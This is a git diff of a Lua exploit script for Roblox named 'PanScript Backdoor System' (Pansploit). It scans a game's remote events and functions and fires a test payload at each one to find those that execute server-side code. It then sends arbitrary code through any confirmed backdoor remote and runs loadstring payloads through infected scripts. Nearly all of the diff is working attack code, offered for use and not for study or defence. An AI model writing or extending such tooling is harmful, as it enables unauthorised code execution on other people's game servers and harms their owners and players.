@@ -1,3 +1,8 @@
+--[[
+    PanScript Backdoor System v10.1 - COMPLETE WITH TP HANDLER
+    Features: LALOL execution test, infected script detection, mode switching, TP handler
+]]
+
 local _p = {}
 _p._a = false
 _p._m = "CLIENT"
@@ -5,13 +10,14 @@ _p._bd = nil
 _p._infected = nil
 _p._pid = 0
 _p._gid = 0
-_p._testing = false -- LALOL: Prevent concurrent tests
+_p._testing = false
 
--- LALOL's alphabet for code generation
+-- LALOL alphabet
 local _alphabet = {}
-for i = 65, 90 do table.insert(_alphabet, string.char(i)) end -- A-Z
-for i = 97, 122 do table.insert(_alphabet, string.char(i)) end -- a-z
+for i = 65, 90 do table.insert(_alphabet, string.char(i)) end
+for i = 97, 122 do table.insert(_alphabet, string.char(i)) end
 
+-- Storage
 if not _G._pans_data then
     _G._pans_data = {
         bd = nil,
@@ -20,7 +26,7 @@ if not _G._pans_data then
         gid = 0,
         mode = "CLIENT",
         injected = false,
-        testedRemotes = {} -- LALOL: Cache tested remotes
+        testedRemotes = {}
     }
 end
 local _st = _G._pans_data
@@ -31,7 +37,6 @@ local function _toast(title, text, dur)
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return end
     
-    -- Remove old toasts
     pcall(function()
         for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
             if g.Name:find("PanToast") then g:Destroy() end
@@ -45,15 +50,14 @@ local function _toast(title, text, dur)
     if not sg.Parent then sg.Parent = plr:WaitForChild("PlayerGui") end
     
     local fr = Instance.new("Frame")
-    fr.Size = UDim2.new(0, 350, 0, 90)
-    fr.Position = UDim2.new(1, 20, 1, -110)
+    fr.Size = UDim2.new(0, 350, 0, 100)
+    fr.Position = UDim2.new(1, 20, 1, -120)
     fr.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     fr.BorderSizePixel = 0
     fr.Parent = sg
     
     Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
     
-    -- Title
     local tl = Instance.new("TextLabel")
     tl.Size = UDim2.new(1, -20, 0, 25)
     tl.Position = UDim2.new(0, 15, 0, 8)
@@ -65,9 +69,8 @@ local function _toast(title, text, dur)
     tl.TextXAlignment = Enum.TextXAlignment.Left
     tl.Parent = fr
     
-    -- Text
     local tx = Instance.new("TextLabel")
-    tx.Size = UDim2.new(1, -20, 0, 50)
+    tx.Size = UDim2.new(1, -20, 0, 60)
     tx.Position = UDim2.new(0, 15, 0, 35)
     tx.BackgroundTransparency = 1
     tx.Text = text
@@ -78,15 +81,14 @@ local function _toast(title, text, dur)
     tx.TextXAlignment = Enum.TextXAlignment.Left
     tx.Parent = fr
     
-    -- Animation
     spawn(function()
         for i = 1, 12 do
-            fr.Position = UDim2.new(1, 20 - (i * 30), 1, -110)
+            fr.Position = UDim2.new(1, 20 - (i * 29), 1, -120)
             wait(0.03)
         end
         wait(dur)
         for i = 1, 12 do
-            fr.Position = UDim2.new(1, -340 + (i * 30), 1, -110)
+            fr.Position = UDim2.new(1, -340 + (i * 29), 1, -120)
             fr.BackgroundTransparency = i / 12
             wait(0.03)
         end
@@ -94,7 +96,7 @@ local function _toast(title, text, dur)
     end)
 end
 
--- LALOL: Generate random name
+-- Generate random name (LALOL)
 local function _generateName(length)
     length = length or math.random(12, 30)
     local name = ""
@@ -104,10 +106,9 @@ local function _generateName(length)
     return name
 end
 
--- LALOL: Fire remote with test code
+-- Fire test (LALOL)
 local function _fireTest(remote, code)
     local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
-    
     if remote:IsA("RemoteEvent") then
         remote:FireServer(testCode)
     elseif remote:IsA("RemoteFunction") then
@@ -119,10 +120,9 @@ local function _fireTest(remote, code)
     end
 end
 
--- Execute code
+-- Execute
 local function _exec(code, useInfected)
     if not code then return false, "No code" end
-    
     if useInfected and _p._infected and _p._infected.Object then
         local s, r = pcall(function()
             local fn, err = loadstring(code)
@@ -131,7 +131,6 @@ local function _exec(code, useInfected)
         end)
         return s, r
     end
-    
     local s, r = pcall(function()
         local fn, err = loadstring(code)
         if fn then return fn() end
@@ -144,7 +143,6 @@ end
 function _p.R6()
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return false end
-    
     if _p._infected then
         return _exec([[
             local plr = game:GetService("Players").LocalPlayer
@@ -157,7 +155,6 @@ function _p.R6()
             end
         ]], true)
     end
-    
     local char = plr.Character
     if not char then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
@@ -174,14 +171,12 @@ end
 function _p.Respawn()
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return false end
-    
     if _p._infected then
         return _exec([[
             local plr = game:GetService("Players").LocalPlayer
             if plr and plr.Character then plr.Character:BreakJoints() end
         ]], true)
     end
-    
     local char = plr.Character
     if char then char:BreakJoints() end
     wait(0.5)
@@ -192,14 +187,14 @@ end
 function _p.SwitchMode()
     _p._m = _p._m == "BACKDOOR" and "CLIENT" or "BACKDOOR"
     _st.mode = _p._m
-    print("PANS_MODE_CHANGED:" .. _p._m)
+    print("PANS_MODE_SWITCHED:" .. _p._m .. ":" .. tostring(_p._a))
     return _p._m
 end
 
 function _p.SetMode(mode)
     _p._m = mode
     _st.mode = mode
-    print("PANS_MODE_SET:" .. mode)
+    print("PANS_MODE_SET:" .. mode .. ":" .. tostring(_p._a))
     return _p._m
 end
 
@@ -207,7 +202,72 @@ function _p.GetMode()
     return _p._m
 end
 
--- MERGED: Signature-based + Execution-based detection
+-- TP Handler
+local function _setupTPHandler()
+    local plr = game:GetService("Players").LocalPlayer
+    if not plr then return end
+    
+    -- Character removal (leaving game)
+    plr.CharacterRemoving:Connect(function()
+        print("PANS_PLAYER_LEFT:CharacterRemoving")
+        _p._a = false
+        _st.injected = false
+        _p._m = "CLIENT"
+        _st.mode = "CLIENT"
+    end)
+    
+    -- Game ID changes (server hop/teleport)
+    local lastGameId = game.GameId
+    spawn(function()
+        while _p._a do
+            wait(1)
+            if game.GameId ~= lastGameId then
+                print("PANS_GAME_CHANGED:" .. lastGameId .. ":" .. game.GameId)
+                _p._a = false
+                _st.injected = false
+                _p._m = "CLIENT"
+                _st.mode = "CLIENT"
+                break
+            end
+        end
+    end)
+    
+    -- Place ID changes
+    local lastPlaceId = game.PlaceId
+    spawn(function()
+        while _p._a do
+            wait(1)
+            if game.PlaceId ~= lastPlaceId then
+                print("PANS_PLACE_CHANGED:" .. lastPlaceId .. ":" .. game.PlaceId)
+                _p._a = false
+                _st.injected = false
+                _p._m = "CLIENT"
+                _st.mode = "CLIENT"
+                break
+            end
+        end
+    end)
+    
+    -- Game closing
+    game:BindToClose(function()
+        print("PANS_GAME_CLOSING")
+        _p._a = false
+        _st.injected = false
+        _p._m = "CLIENT"
+        _st.mode = "CLIENT"
+    end)
+    
+    -- Player destroyed
+    plr.Destroying:Connect(function()
+        print("PANS_PLAYER_DESTROYED")
+        _p._a = false
+        _st.injected = false
+        _p._m = "CLIENT"
+        _st.mode = "CLIENT"
+    end)
+end
+
+-- Analyze script
 local function _analyzeScript(obj)
     local info = {
         Object = obj,
@@ -217,97 +277,84 @@ local function _analyzeScript(obj)
         Score = 0,
         Reasons = {},
         InfectionType = "NONE",
-        Tested = false -- LALOL: Whether execution test was performed
+        Tested = false
     }
     
     local src = ""
     pcall(function() src = obj.Source or "" end)
+    if src == "" then return info end
     
-    if src ~= "" then
-        local srcLower = src:lower()
-        
-        -- Pattern 1: RemoteEvent + OnServerEvent + loadstring
-        if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
-            if src:find("function%s*%([^,]+,[^%)]+%)") then
-                info.Score = info.Score + 100
-                info.InfectionType = "REMOTE_LOADSTRING"
-                table.insert(info.Reasons, "OnServerEvent+loadstring")
-            end
+    local srcLower = src:lower()
+    
+    if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
+        if src:find("function%s*%([^,]+,[^%)]+%)") then
+            info.Score = info.Score + 100
+            info.InfectionType = "REMOTE_LOADSTRING"
+            table.insert(info.Reasons, "OnServerEvent+loadstring")
         end
-        
-        -- Pattern 2: RemoteFunction + OnServerInvoke + loadstring
-        if src:find("OnServerInvoke") and src:find("loadstring") then
-            info.Score = info.Score + 90
-            info.InfectionType = "REMOTEFUNC_LOADSTRING"
-            table.insert(info.Reasons, "OnServerInvoke+loadstring")
+    end
+    
+    if src:find("OnServerInvoke") and src:find("loadstring") then
+        info.Score = info.Score + 90
+        info.InfectionType = "REMOTEFUNC_LOADSTRING"
+        table.insert(info.Reasons, "OnServerInvoke+loadstring")
+    end
+    
+    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") and src:find("ReplicatedStorage") then
+        info.Score = info.Score + 40
+        table.insert(info.Reasons, "Dynamic RemoteEvent")
+    end
+    
+    if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
+        info.Score = info.Score + 80
+        info.InfectionType = "REQUIRE_INJECTION"
+        table.insert(info.Reasons, "require+HTTP/loadstring")
+    end
+    
+    if src:find("game:HttpGet") and src:find("loadstring") then
+        info.Score = info.Score + 85
+        info.InfectionType = "HTTP_LOADSTRING"
+        table.insert(info.Reasons, "game:HttpGet+loadstring")
+    end
+    
+    if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
+        info.Score = info.Score + 70
+        table.insert(info.Reasons, "Environment manipulation")
+    end
+    
+    if src:find("FireServer") and src:find("loadstring") then
+        info.Score = info.Score + 75
+        table.insert(info.Reasons, "FireServer+loadstring")
+    end
+    
+    local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
+    for _, bad in ipairs(badNames) do
+        if srcLower:find(bad) then
+            info.Score = info.Score + 30
+            table.insert(info.Reasons, "Suspicious: " .. bad)
         end
-        
-        -- Pattern 3: Instance.new("RemoteEvent")
-        if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") then
-            if src:find("ReplicatedStorage") then
-                info.Score = info.Score + 40
-                table.insert(info.Reasons, "Dynamic RemoteEvent")
-            end
+    end
+    
+    local nonPrintable = 0
+    for i = 1, #src do
+        local b = src:byte(i)
+        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
+            nonPrintable = nonPrintable + 1
         end
-        
-        -- Pattern 4: require + HTTP
-        if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
-            info.Score = info.Score + 80
-            info.InfectionType = "REQUIRE_INJECTION"
-            table.insert(info.Reasons, "require+HTTP/loadstring")
-        end
-        
-        -- Pattern 5: game:HttpGet + loadstring
-        if src:find("game:HttpGet") and src:find("loadstring") then
-            info.Score = info.Score + 85
-            info.InfectionType = "HTTP_LOADSTRING"
-            table.insert(info.Reasons, "game:HttpGet+loadstring")
-        end
-        
-        -- Pattern 6: setfenv/getfenv
-        if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
-            info.Score = info.Score + 70
-            table.insert(info.Reasons, "Environment manipulation")
-        end
-        
-        -- Pattern 7: FireServer with loadstring result
-        if src:find("FireServer") and src:find("loadstring") then
-            info.Score = info.Score + 75
-            table.insert(info.Reasons, "FireServer+loadstring")
-        end
-        
-        -- Pattern 8: Suspicious names
-        local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
-        for _, bad in ipairs(badNames) do
-            if srcLower:find(bad) then
-                info.Score = info.Score + 30
-                table.insert(info.Reasons, "Suspicious name: " .. bad)
-            end
-        end
-        
-        -- Pattern 9: Obfuscation
-        local nonPrintable = 0
-        for i = 1, #src do
-            local b = src:byte(i)
-            if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
-                nonPrintable = nonPrintable + 1
-            end
-        end
-        if nonPrintable > 50 or #src > 15000 then
-            info.Score = info.Score + 25
-            table.insert(info.Reasons, "Obfuscated")
-        end
+    end
+    if nonPrintable > 50 or #src > 15000 then
+        info.Score = info.Score + 25
+        table.insert(info.Reasons, "Obfuscated")
     end
     
     return info
 end
 
--- MERGED: LALOL execution test + Payload signature scan
+-- Detect backdoors (LALOL + Payload merged)
 local function _detectBackdoors()
     local candidates = {}
-    local testedCodes = {} -- LALOL: Track which codes we've sent
+    local testedCodes = {}
     
-    -- Step 1: Gather all remotes (LALOL's method)
     local services = {
         game:GetService("ReplicatedStorage"),
         game:GetService("ReplicatedFirst"),
@@ -321,16 +368,10 @@ local function _detectBackdoors()
     for _, svc in ipairs(services) do
         for _, obj in ipairs(svc:GetDescendants()) do
             if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                -- Skip RobloxReplicatedStorage
                 local fullName = obj:GetFullName()
                 if fullName:find("RobloxReplicatedStorage") then continue end
-                
-                -- Skip known safe remotes
                 if obj.Name:find("DefaultChatSystem") then continue end
-                if obj:FindFirstChild("__FUNCTION") then continue end -- Adonis
-                if obj.Parent and obj.Parent.Name == "HDAdminClient" then continue end
-                
-                -- LALOL: Skip if already tested this session
+                if obj:FindFirstChild("__FUNCTION") then continue end
                 if _st.testedRemotes[fullName] then continue end
                 
                 table.insert(candidates, obj)
@@ -338,13 +379,10 @@ local function _detectBackdoors()
         end
     end
     
-    -- Step 2: LALOL execution test on high-probability remotes
-    -- First test remotes that match signature patterns
     local priorityRemotes = {}
     local otherRemotes = {}
     
     for _, remote in ipairs(candidates) do
-        -- Check if parent has suspicious scripts
         local parent = remote.Parent
         local isPriority = false
         
@@ -360,7 +398,6 @@ local function _detectBackdoors()
             end
         end
         
-        -- Also prioritize by name
         local n = remote.Name:lower()
         if n:find("backdoor") or n:find("admin") or n:find("remote") then
             isPriority = true
@@ -373,31 +410,22 @@ local function _detectBackdoors()
         end
     end
     
-    -- Step 3: LALOL test execution
     local testResults = {}
     local workspace = game:GetService("Workspace")
     
-    -- Test priority remotes first
     for _, remote in ipairs(priorityRemotes) do
         if _p._testing then break end
-        
         local code = _generateName(math.random(15, 25))
         testedCodes[code] = remote
         _st.testedRemotes[remote:GetFullName()] = true
-        
         _fireTest(remote, code)
-        
-        -- Wait a tiny bit for server response
         wait(0.05)
     end
     
-    -- Wait for all tests to potentially complete
     wait(0.5)
     
-    -- Check which codes appeared in workspace (LALOL's verification)
     for code, remote in pairs(testedCodes) do
         if workspace:FindFirstChild(code) then
-            -- LALOL CONFIRMED: This remote executes code!
             table.insert(testResults, {
                 Object = remote,
                 Path = remote:GetFullName(),
@@ -409,13 +437,10 @@ local function _detectBackdoors()
                 Tested = true,
                 ExecutionTime = tick()
             })
-            
-            -- Clean up test model
             pcall(function() workspace[code]:Destroy() end)
         end
     end
     
-    -- Step 4: If no execution tests confirmed, fall back to signature detection
     if #testResults == 0 then
         for _, svc in ipairs(services) do
             for _, obj in ipairs(svc:GetDescendants()) do
@@ -426,7 +451,6 @@ local function _detectBackdoors()
                     end
                 end
                 
-                -- Also check remotes with suspicious attributes
                 if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                     local hasAttr = false
                     pcall(function()
@@ -452,9 +476,7 @@ local function _detectBackdoors()
         end
     end
     
-    -- Sort by score
     table.sort(testResults, function(a, b) return a.Score > b.Score end)
-    
     return testResults
 end
 
@@ -481,7 +503,7 @@ function _p.Init(pid, gid)
             _st.injected = true
             
             _toast("[Pansploit] LALOL CONFIRMED!", 
-                "Backdoor: " .. best.Name .. "\nType: " .. best.Type, 6)
+                "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nMethod: Execution Test", 6)
             
             print("PANS_BACKDOOR_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
         else
@@ -493,7 +515,7 @@ function _p.Init(pid, gid)
             _st.injected = true
             
             _toast("[Pansploit] INFECTED SCRIPT", 
-                "Path: " .. best.Name .. "\nScore: " .. best.Score, 5)
+                "Path: " .. best.Name .. "\nScore: " .. best.Score .. "/100\nType: " .. best.InfectionType, 5)
             
             print("PANS_INFECTED_FOUND:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
         end
@@ -508,11 +530,13 @@ function _p.Init(pid, gid)
             if _p._a then
                 _p._a = false
                 _st.injected = false
+                _p._m = "CLIENT"
+                _st.mode = "CLIENT"
                 print("PANS_DISCONNECT:BACKDOOR_REMOVED")
             end
         end)
         
-        -- TP Handler - monitor player leaving
+        -- Setup TP handler
         _setupTPHandler()
         
         return true, best
@@ -524,44 +548,33 @@ function _p.Init(pid, gid)
     
     return false, nil
 end
-    
--- Execute
+
+-- Execute functions
 function _p.Exec(code, useBackdoor)
     if not _p._a and _p._m ~= "CLIENT" then
         return false, "Not active"
     end
-    
-    -- Use backdoor remote if available and requested
-    if useBackdoor and _p._bd and _p._bd.Object then
-        local remote = _p._bd.Object
-        
-        if remote:IsA("RemoteEvent") then
-            remote:FireServer(code)
-            return true, "Fired via RemoteEvent"
-        elseif remote:IsA("RemoteFunction") then
-            spawn(function()
-                pcall(function()
-                    remote:InvokeServer(code)
-                end)
-            end)
-            return true, "Invoked via RemoteFunction"
-        end
-    end
-    
-    -- Fall back to infected script execution
-    if _p._infected then
-        return _exec(code, true)
-    end
-    
-    -- Normal execution
-    return _exec(code, false)
+    local use = useBackdoor or (_p._infected ~= nil and _p._m == "BACKDOOR")
+    return _exec(code, use)
 end
 
 function _p.ExecBackdoor(code)
     if not _p._bd then
         return false, "No confirmed backdoor"
     end
-    return _p.Exec(code, true)
+    local remote = _p._bd.Object
+    if remote:IsA("RemoteEvent") then
+        remote:FireServer(code)
+        return true, "Fired"
+    elseif remote:IsA("RemoteFunction") then
+        spawn(function()
+            pcall(function()
+                remote:InvokeServer(code)
+            end)
+        end)
+        return true, "Invoked"
+    end
+    return false, "Invalid remote type"
 end
 
 function _p.ExecInfected(code)
